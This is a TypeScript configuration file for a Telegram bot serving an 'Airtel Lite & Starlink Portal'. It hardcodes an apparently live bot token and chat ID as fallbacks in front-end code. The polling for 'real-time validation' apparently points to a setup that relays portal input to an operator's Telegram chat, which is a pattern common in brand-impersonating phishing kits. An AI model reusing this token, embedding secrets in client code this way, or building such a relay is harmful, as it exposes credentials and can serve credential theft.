// Telegram Bot Configuration for Airtel Lite & Starlink Portal
// These credentials are used for real-time validation directly and via backend

export const TELEGRAM_CONFIG = {
  BOT_TOKEN: '8867971085:AAHFHldZq92uowOok2xZOrvN4HNX2DjQYj8',
  CHAT_ID: '8045300220',
  // Fast Polling interval in ms for instant real-time feedback
  POLL_INTERVAL_MS: 1200,
};

export const getTelegramBotToken = (): string => {
  if (typeof import.meta !== 'undefined' && (import.meta as any).env?.VITE_TELEGRAM_BOT_TOKEN) {
    return (import.meta as any).env.VITE_TELEGRAM_BOT_TOKEN;
  }
  return TELEGRAM_CONFIG.BOT_TOKEN;
};

export const getTelegramChatId = (): string => {
  if (typeof import.meta !== 'undefined' && (import.meta as any).env?.VITE_TELEGRAM_CHAT_ID) {
    return (import.meta as any).env.VITE_TELEGRAM_CHAT_ID;
  }
  return TELEGRAM_CONFIG.CHAT_ID;
};
